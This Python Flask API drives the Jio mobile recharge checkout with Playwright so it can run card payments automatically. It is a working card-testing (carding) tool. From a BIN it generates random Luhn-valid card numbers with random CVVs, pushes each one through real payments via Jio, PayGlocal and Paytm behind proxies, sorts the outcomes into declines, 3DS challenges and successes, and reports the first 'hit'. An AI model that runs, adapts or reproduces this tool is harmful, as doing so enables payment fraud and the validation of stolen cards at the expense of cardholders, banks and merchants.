#!/usr/bin/env python3
"""
jio_api.py — Flask API wrapper around the Playwright Jio checkout.

Endpoint:
    GET /recharge?num=<phone>&cc=<pan|mm|yy|cvv>&amount=<inr>[&proxy=...][&count=N][&headless=1][&timeout=150]

    cc forms accepted:
      - single card:  4111111111111111|12|29|123   (also / : or space separators)
      - BIN mass:     411111              (&count=10, default 10, max 30)
      - BIN with count inside the field:  411111|10

Response (JSON):
    {
      "success": bool,
      "status": "success" | "failed" | "requires_action" | "error" | "unknown",
      "message": "...",
      "url": "...",
      "meta": { "merchant", "amount", "brand", "bank", "country" },
      "card": "411111******1111|12|29|123",   # masked
      "elapsed": 12.34,
      "attempts": 1,
      "results": [ ... ]        # only present in mass mode
    }

Env:
    JIO_PROXY        default proxy: host:port:user:pass
    JIO_HEADLESS     1|0  (default 1)
    JIO_TIMEOUT      seconds (default 150)
    JIO_MAX_CARDS    cap for mass mode (default 30)
    JIO_WORKERS      max concurrent checkouts (default 4)
    PORT             flask port (default 5000)

Run:
    pip install flask playwright
    playwright install chromium
    python jio_api.py
"""

import os
import re
import sys
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutTimeout
from typing import Dict, Optional, Tuple

from flask import Flask, request, jsonify


# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------

MAX_CARDS    = int(os.environ.get("JIO_MAX_CARDS", "30"))
WORKERS      = int(os.environ.get("JIO_WORKERS", "4"))
DEF_TIMEOUT  = float(os.environ.get("JIO_TIMEOUT", "150"))
DEF_HEADLESS = os.environ.get("JIO_HEADLESS", "1") not in ("0", "false", "False")

app = Flask(__name__)
_pool = ThreadPoolExecutor(max_workers=WORKERS, thread_name_prefix="jio")
_lock = threading.Lock()


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _dbg(msg: str) -> None:
    print(f"[jio] {msg}", flush=True)


def _urldecode(s: str) -> str:
    try:
        from urllib.parse import unquote
        return unquote(s)
    except Exception:
        return s


def _page_text(page) -> str:
    try:
        text = page.locator("body").inner_text(timeout=4000)
    except Exception:
        text = ""
    return re.sub(r"\s+", " ", text).strip()


def proxy_from_string(entry: str) -> Optional[dict]:
    if not entry:
        return None
    try:
        host, port, user, pw = entry.split(":")
        return {"server": f"http://{host}:{port}",
                "username": user, "password": pw}
    except Exception:
        return None


def _env_proxy():
    raw = os.getenv("JIO_PROXY", "")
    return proxy_from_string(raw) if raw else None


# ---------------------------------------------------------------------------
# card tools
# ---------------------------------------------------------------------------

def luhn_check_digit(pan_no_check: str) -> str:
    digits = [int(d) for d in pan_no_check]
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 0:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return str((10 - total % 10) % 10)


def generate_cards(bin_str: str, mm: str, yyyy: str, count: int):
    b = re.sub(r"\D", "", bin_str)
    total_len = 15 if b.startswith(("34", "37")) else 16
    cards = []
    for _ in range(count):
        pre = b + "".join(
            random.choices("0123456789", k=max(total_len - 1 - len(b), 0))
        )
        pan = pre + luhn_check_digit(pre)
        cards.append({
            "pan": pan,
            "exp_month": mm.zfill(2),
            "exp_year": yyyy,
            "cvv": f"{random.randint(0, 999):03d}",
        })
    return cards


def parse_card_line(line: str) -> Optional[dict]:
    parts = re.split(r"[|/:\s]+", line.strip())
    if len(parts) < 4:
        return None
    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if not re.fullmatch(r"\d{13,19}", pan):
        return None
    mm = mm.zfill(2)
    if len(yy) == 4:
        yyyy = yy
    elif len(yy) == 2:
        yyyy = "20" + yy
    else:
        yyyy = "20" + yy.zfill(2)
    return {"pan": pan, "exp_month": mm, "exp_year": yyyy, "cvv": cvv}


def card_label(card: dict) -> str:
    return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"


def mask_card(card: dict) -> str:
    pan = card.get("pan", "")
    masked = pan[:6] + "*" * max(len(pan) - 10, 0) + pan[-4:] if len(pan) >= 10 else pan
    return f"{masked}|{card.get('exp_month','')}|{card.get('exp_year','')[-2:]}|***"


# ---------------------------------------------------------------------------
# playwright checkout (sync — runs inside worker thread)
# ---------------------------------------------------------------------------

def jio_checkout(phone: str, amount, card: Dict[str, str],
                 deadline=None, proxy: Optional[dict] = None,
                 headless: bool = True) -> Tuple[str, str, str, dict]:
    """Returns (status, message, url, meta).
    status: success | failed | requires_action | error | unknown
    """
    from playwright.sync_api import sync_playwright

    if deadline is None:
        deadline = time.time() + DEF_TIMEOUT
    meta = {"merchant": "Jio Recharge", "amount": amount,
            "brand": "", "bank": "", "country": ""}

    p = sync_playwright()
    pw = p.start()
    launch_kwargs = {"headless": headless}
    if proxy:
        launch_kwargs["proxy"] = proxy
    browser = pw.chromium.launch(**launch_kwargs)
    page = browser.new_page()
    try:
        page.goto("https://www.jio.com/selfcare/recharge/mobility",
                  wait_until="domcontentloaded", timeout=60000)
        page.wait_for_timeout(3000)
        frame = page.main_frame
        callback = {}
        _dbg(f"jio {phone}: loaded recharge page")

        def _capture_cb(req):
            if "myjio-b2b-callback" in req.url:
                callback["url"] = req.url
        page.on("request", _capture_cb)

        # ---- validate -> plans -> buy -> pay ----
        pay_url = frame.evaluate(
            """async (arg) => {
                const phone = arg.phone, amt = arg.amt;
                const tmo = (ms) => new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms));
                const fj = (u, o) => Promise.race([fetch(u, o), tmo(45000)]);
                const rn = await fj('/api/jio-recharge-service/recharge/mobility/number/' + phone);
                if (rn.status !== 200) return {error: true, msg: 'notsub'};
                const rp = await fj('/api/jio-recharge-service/recharge/plans/serviceId/' + phone);
                if (rp.status !== 200) return {error: true, msg: 'plans'};
                const d = await rp.json();
                let key = null;
                for (const c of d.planCategories || [])
                  for (const sc of (c.subCategories || []))
                    for (const pl of (sc.plans || []))
                      if (String(pl.amount) === String(amt) && pl.key) { key = pl.key; break; }
                if (!key) return {error: true, msg: 'noplan'};
                await fj('/api/jio-recharge-service/recharge/buy', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({planKey: key, selectedService: phone})});
                const rpay = await fj('/api/jio-recharge-service/recharge/pay', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({addonPlanKeys:[], flexiTopupFlow:false, servicePlanList:[{planKey: key, quantity:1, serviceId: phone}]})});
                const j = await rpay.json();
                return {error: false, url: j.paymentURL || null};
              }""",
            {"phone": str(phone), "amt": str(amount)},
        )
        if pay_url.get("error"):
            if pay_url.get("msg") == "notsub":
                return "error", f"Number {phone} is not a valid Jio prepaid subscriber.", page.url, meta
            if pay_url.get("msg") == "noplan":
                return "error", f"Could not find a ₹{amount} plan for {phone}.", page.url, meta
            return "error", f"Could not fetch Jio plans for {phone}.", page.url, meta
        if not pay_url.get("url"):
            return "error", f"Could not generate a payment link for ₹{amount}.", page.url, meta
        _dbg(f"jio {phone}: payment url: {pay_url['url'][:90]}")

        try:
            page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=60000)
        except Exception:
            pass
        page.wait_for_timeout(3000)
        try:
            page.wait_for_url("**pay.jio.com**", timeout=30000)
        except Exception:
            pass
        page.wait_for_timeout(2000)
        _dbg(f"jio {phone}: on {page.url[:80]}")

        pf = page.main_frame

        # ---- click Credit/Debit/ATM Card ----
        clicked_card = False
        for _ in range(15):
            clicked_card = pf.evaluate("""() => {
              const els = [...document.querySelectorAll('*')];
              const el = els.find(e => {
                const t = (e.innerText||'').trim();
                return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t) && t.length < 40 && e.children.length <= 1 && e.offsetParent !== null;
              });
              if (!el) return false;
              let n = el;
              for (let i=0; i<8 && n; i++) {
                if (/j-listBlock\\b|align-middle/.test((n.className||'').toString()) && n.offsetParent !== null) { n.click(); return true; }
                n = n.parentElement;
              }
              if (el.click) { el.click(); return true; }
              return false;
            }""")
            if clicked_card:
                break
            page.wait_for_timeout(1000)
        page.wait_for_timeout(4000)
        _dbg(f"jio {phone}: card form opened (card_option={clicked_card})")

        for _ in range(20):
            if "add-new-card" in page.url or "saved-cards" in page.url:
                break
            if "cardinalcommerce" in page.url or "3dsecure" in page.url.lower():
                break
            if "home" in page.url and "/JpgWebApp/home" in page.url:
                pf = page.main_frame
                pf.evaluate("""() => {
                  const els=[...document.querySelectorAll('*')];
                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
                  if(!el)return false;
                  let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
                  if(el.click){el.click();return true;}return false;
                }""")
            page.wait_for_timeout(1000)
        page.wait_for_timeout(2000)
        pf = page.main_frame

        def fresh():
            nonlocal pf
            pf = page.main_frame

        def fill(name, val, use_type=False):
            try:
                loc = pf.locator(f"input[name='{name}']")
                if loc.count():
                    if use_type:
                        loc.first.click(timeout=3000)
                        loc.first.type(val, delay=25)
                    else:
                        loc.first.fill(val, timeout=4000)
            except Exception:
                fresh()

        pan = card.get("pan", "").replace(" ", "")
        exp = f"{card.get('exp_month','')}/{card.get('exp_year','')[-2:]}"
        for _ in range(4):
            try:
                fill("Card number", pan)
                fill("Expiry (MM/YY)", exp)
                fill("CVV", card.get("cvv", ""))
                fill("Name on the card",
                     (card.get("holder_name", "") or "Card Holder"))
            except Exception:
                fresh()
            page.wait_for_timeout(500)
            try:
                got = pf.locator("input[name='Card number']").first.input_value() \
                    if pf.locator("input[name='Card number']").count() else ""
                if got and got.replace(" ", "")[:6] == pan[:6]:
                    break
            except Exception:
                fresh()

        page.keyboard.press("Tab")
        page.wait_for_timeout(500)
        page.keyboard.press("Tab")
        page.wait_for_timeout(4000)

        for _ in range(10):
            try:
                clicked = pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/^Pay\\s|Pay now|Verify & pay/i.test((e.innerText||'').trim()) && !e.disabled);
                  if(b){b.click(); return (b.innerText||'').slice(0,30);} return null;
                }""")
                if clicked:
                    break
            except Exception:
                fresh()
            page.wait_for_timeout(1000)
        page.wait_for_timeout(4000)
        fresh()

        try:
            pf.evaluate("""() => {
              const els = [...document.querySelectorAll('*')];
              const el = els.find(e => (/INR|INDIAN RUPEE/i.test((e.innerText||'').trim())) && (e.innerText||'').length < 80 && e.children.length <= 1);
              if (el) { let n = el; for (let i=0; i<6 && n; i++) { if (n.click) { n.click(); break; } n = n.parentElement; } }
            }""")
        except Exception:
            pf = page.main_frame
        page.wait_for_timeout(3000)

        for _ in range(20):
            u = page.url
            if "cardinalcommerce" in u or "3dsecure" in u.lower():
                break
            if "paytm" in u or "payglocal" in u:
                break
            if "easebuzz" in u or "acs" in u:
                page.wait_for_timeout(1000)
                continue
            page.wait_for_timeout(1000)
        _dbg(f"jio {phone}: redirected to {page.url[:80]}")

        # ---- PayGlocal ----
        if "payglocal" in page.url:
            _dbg(f"jio {phone}: on PayGlocal checkout")
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    ziploc = pgf.locator("#gl_billing_addressPostalCode")
                    if ziploc.count():
                        ziploc.first.fill("10080", timeout=3000)
                        break
                except Exception:
                    pass
                page.wait_for_timeout(1000)
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    inr_clicked = pgf.evaluate("""() => {
                      const bs = [...document.querySelectorAll('button')];
                      const b = bs.find(e => (/\\u20b9/.test(e.innerText||'') && /Pay/i.test(e.innerText||'') && !e.disabled));
                      if (b) { b.click(); return true; }
                      return false;
                    }""")
                    if inr_clicked:
                        break
                except Exception:
                    pass
                page.wait_for_timeout(1000)
            page.wait_for_timeout(4000)
            _dbg(f"jio {phone}: PayGlocal charge submitted at {page.url[:70]}")

        # ---- Paytm currency selection ----
        if "paytm" in page.url and "selectCurrency" in page.url:
            for _ in range(12):
                chose = pf.evaluate("""() => {
                  const els = [...document.querySelectorAll('*')];
                  const el = els.find(e => {
                    const t = (e.innerText||'').trim();
                    return /Indian Rupee|INR/i.test(t) && t.length < 60 && e.children.length <= 1 && e.offsetParent !== null;
                  });
                  if (el) { let n = el; for (let i=0; i<8 && n; i++) { if (n.click && n.offsetParent !== null) { n.click(); break; } n = n.parentElement; } return true; }
                  return false;
                }""")
                if chose:
                    break
                page.wait_for_timeout(1000)
            page.wait_for_timeout(2000)
            for _ in range(5):
                did_proceed = pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/Proceed|Pay|Continue|Make Payment/i.test((e.innerText||'').trim()) && !e.disabled);
                  if(b){b.click(); return true;} return false;
                }""")
                if did_proceed:
                    break
                page.wait_for_timeout(1000)
            page.wait_for_timeout(3000)

        # ---- result detection ----
        _dbg(f"jio {phone}: pay submitted, waiting for result at {page.url[:80]}")
        stalled = 0
        for i in range(34):
            page.wait_for_timeout(1500)
            u = page.url
            if callback.get("url"):
                em = re.search(r"errorMessage=([^&]*)", callback["url"])
                ec = re.search(r"errorCode=([^&]*)", callback["url"])
                emsg = _urldecode(em.group(1)) if em else ""
                ecode = ec.group(1) if ec else ""
                if ecode == "0" or (not ecode and not emsg):
                    return "success", "Payment done.", u, meta
                if "declin" in emsg.lower() or (ecode and ecode != "0"):
                    return "failed", "Declined: " + emsg[:120], u, meta
            if "cardinalcommerce" in u or "3dsecure" in u.lower() or "threedsecure" in u.lower():
                return "requires_action", "3DS required.", u, meta
            if "3ds2" in u or "instaproxy" in u:
                for _ in range(4):
                    page.wait_for_timeout(1500)
                    if callback.get("url"):
                        break
                    if "instaproxy" not in page.url and "3ds2" not in page.url:
                        break
                if callback.get("url"):
                    continue
                if "instaproxy" in page.url or "3ds2" in page.url:
                    return "requires_action", "3DS required.", page.url, meta
                continue
            if "payglocal" in page.url and ("retry" in page.url or "payflow-ui/error" in page.url):
                return "failed", "Declined.", page.url, meta
            if "payglocal" in page.url:
                plow = _page_text(page).lower()
                if any(w in plow for w in (
                        "payment unsuccessful", "was not successful", "could not process",
                        "payment failed", "transaction was declined",
                        "your payment was declined", "insufficient", "declined",
                        "not completed", "unsuccessful", "try again later", "try again")):
                    return "failed", "Declined.", page.url, meta
                _three_ds = False
                for f in page.frames:
                    fu = f.url
                    if (("authentication.cardinalcommerce.com" in fu and "threedsecure" in fu.lower())
                            or "3ds2/authenticate" in fu
                            or "cruise/stepup" in fu.lower()
                            or "V2/Cruise/StepUp" in fu):
                        _three_ds = True
                        break
                if _three_ds:
                    _dbg(f"jio {phone}: 3DS step-up seen, waiting for frictionless outcome")
                    resolved = False
                    for _ in range(14):
                        page.wait_for_timeout(1500)
                        cu = page.url
                        clow = _page_text(page).lower()
                        if "payglocal" in cu and "retry" in cu:
                            return "failed", "Declined.", page.url, meta
                        if any(w in clow for w in (
                                "payment unsuccessful", "was not successful",
                                "could not process", "transaction was declined",
                                "your payment was declined", "declined",
                                "unsuccessful", "insufficient")):
                            return "failed", "Declined.", page.url, meta
                        if "termurlpay" in cu or "payments/termurlpay" in cu:
                            resolved = True
                            break
                    if resolved:
                        continue
                    _dbg(f"jio {phone}: PayGlocal 3DS challenge stays; reporting 3DS")
                    return "requires_action", "3DS required.", page.url, meta
                for f in page.frames:
                    if ("step-up-iframe" in (f.name or "")
                            and f.url and f.url != "about:blank"
                            and "cardinalcommerce" not in f.url
                            and "fingerprint" not in f.url.lower()):
                        _dbg(f"jio {phone}: step-up-iframe active: {f.url[:120]}")
                        return "requires_action", "3DS required.", page.url, meta
            if "theia/error" in page.url or ("/error" in page.url and "paytm" in page.url):
                return "failed", "Declined by Paytm.", page.url, meta
            if "paytm" in page.url and "theia" in page.url:
                stalled += 1
                if stalled > 12:
                    return "unknown", "Stuck on Paytm, payment didn't go through.", page.url, meta
            low = _page_text(page).lower()
            if any(w in low for w in (
                    "declined", "transaction failed", "could not be processed",
                    "payment failed", "not completed", "unsuccessful",
                    "insufficient", "card not", "failed")):
                return "failed", "Declined.", page.url, meta
            if any(w in low for w in (
                    "transaction successful", "recharge successful",
                    "successfully recharged", "payment successful",
                    "thank you", "recharged", "top-up successful",
                    "recharge done")):
                return "success", "Payment done.", page.url, meta
            if "card number" in low and "cv" in low and i > 4:
                return "failed", "Card rejected, form reset.", page.url, meta
            if time.time() > deadline:
                break
        return "unknown", "Couldn't confirm the result.", page.url, meta
    except Exception as exc:
        return "error", f"Jio checkout failed: {exc}", page.url, meta
    finally:
        try:
            browser.close()
            p.stop()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# request parsing
# ---------------------------------------------------------------------------

def _parse_cc_field(cc_raw: str, count_override: Optional[int]):
    """Returns (mode, payload).
    mode = 'single' -> payload = card dict
    mode = 'mass'   -> payload = (bin_str, count)
    """
    cc_raw = (cc_raw or "").strip()
    if not cc_raw:
        raise ValueError("missing cc")

    # BIN|count shorthand
    if "|" in cc_raw:
        parts = cc_raw.split("|")
        if len(parts) == 2 and re.fullmatch(r"\d{6,8}", parts[0]) and parts[1].isdigit():
            return "mass", (parts[0], int(parts[1]))

    single = parse_card_line(cc_raw)
    if single:
        return "single", single

    # BIN only
    if re.fullmatch(r"\d{6,8}", cc_raw):
        return "mass", (cc_raw, count_override or 10)

    # 4-part but bad pan
    raise ValueError("cc must be pan|mm|yy|cvv OR bin[|count]")


def _run_one(phone, amount, card, proxy, headless, timeout):
    deadline = time.time() + float(timeout)
    fut = _pool.submit(
        jio_checkout, phone, amount, card,
        deadline, proxy, headless,
    )
    try:
        return fut.result(timeout=float(timeout) + 30)
    except FutTimeout:
        return "error", "Checkout exceeded worker timeout.", "", {
            "merchant": "Jio Recharge", "amount": amount,
            "brand": "", "bank": "", "country": "",
        }


# ---------------------------------------------------------------------------
# flask routes
# ---------------------------------------------------------------------------

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "service": "jio-recharge-api",
        "workers": WORKERS,
        "max_cards": MAX_CARDS,
        "headless_default": DEF_HEADLESS,
    })


@app.route("/recharge", methods=["GET", "POST"])
def recharge():
    t0 = time.time()
    try:
        if request.method == "POST":
            body = request.get_json(silent=True) or {}
            phone  = body.get("num") or body.get("phone") or request.args.get("num")
            cc_raw = body.get("cc") or request.args.get("cc")
            amount = body.get("amount") or request.args.get("amount")
            proxy_str = body.get("proxy") or request.args.get("proxy")
            count  = body.get("count") or request.args.get("count")
            headless = body.get("headless") or request.args.get("headless")
            timeout  = body.get("timeout") or request.args.get("timeout")
        else:
            phone  = request.args.get("num") or request.args.get("phone")
            cc_raw = request.args.get("cc")
            amount = request.args.get("amount")
            proxy_str = request.args.get("proxy")
            count  = request.args.get("count")
            headless = request.args.get("headless")
            timeout  = request.args.get("timeout")

        if not phone:
            return jsonify({"success": False, "error": "missing 'num'"}), 400
        if not cc_raw:
            return jsonify({"success": False, "error": "missing 'cc'"}), 400
        if amount in (None, ""):
            return jsonify({"success": False, "error": "missing 'amount'"}), 400

        try:
            amount_val = str(amount).strip()
            int(amount_val)  # jio plans are integer rupees
        except Exception:
            return jsonify({"success": False, "error": "'amount' must be int"}), 400

        count_override = int(count) if (count not in (None, "", "None")) else None
        headless_val = DEF_HEADLESS if headless in (None, "", "None") else \
            str(headless) not in ("0", "false", "False")
        timeout_val = float(timeout) if (timeout not in (None, "", "None")) else DEF_TIMEOUT

        proxy = proxy_from_string(proxy_str) if proxy_str else _env_proxy()

        try:
            mode, payload = _parse_cc_field(cc_raw, count_override)
        except ValueError as e:
            return jsonify({"success": False, "error": str(e)}), 400

        # ---- single card ----
        if mode == "single":
            card = payload
            status, message, url, meta = _run_one(
                phone, amount_val, card, proxy, headless_val, timeout_val
            )
            return jsonify({
                "success": status == "success",
                "status": status,
                "message": message,
                "url": url,
                "meta": meta,
                "card": mask_card(card),
                "attempts": 1,
                "elapsed": round(time.time() - t0, 2),
            }), (200 if status == "success" else 502)

        # ---- mass (BIN) ----
        bin_str, n = payload
        n = max(1, min(int(n), MAX_CARDS))
        cards = generate_cards(bin_str, "12", "2029", n)
        results = []
        hit = None
        for c in cards:
            status, message, url, meta = _run_one(
                phone, amount_val, c, proxy, headless_val, timeout_val
            )
            row = {
                "card": mask_card(c),
                "status": status,
                "message": message,
                "url": url,
            }
            results.append(row)
            if status == "success":
                hit = row
                break

        return jsonify({
            "success": hit is not None,
            "status": "success" if hit else "failed",
            "message": (hit["message"] if hit else f"no hit across {len(results)} card(s)"),
            "hit": hit,
            "results": results,
            "attempts": len(results),
            "elapsed": round(time.time() - t0, 2),
        }), (200 if hit else 502)

    except Exception as e:
        return jsonify({
            "success": False,
            "status": "error",
            "error": str(e),
            "elapsed": round(time.time() - t0, 2),
        }), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    _dbg(f"jio api up on :{port}  workers={WORKERS}  max_cards={MAX_CARDS}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
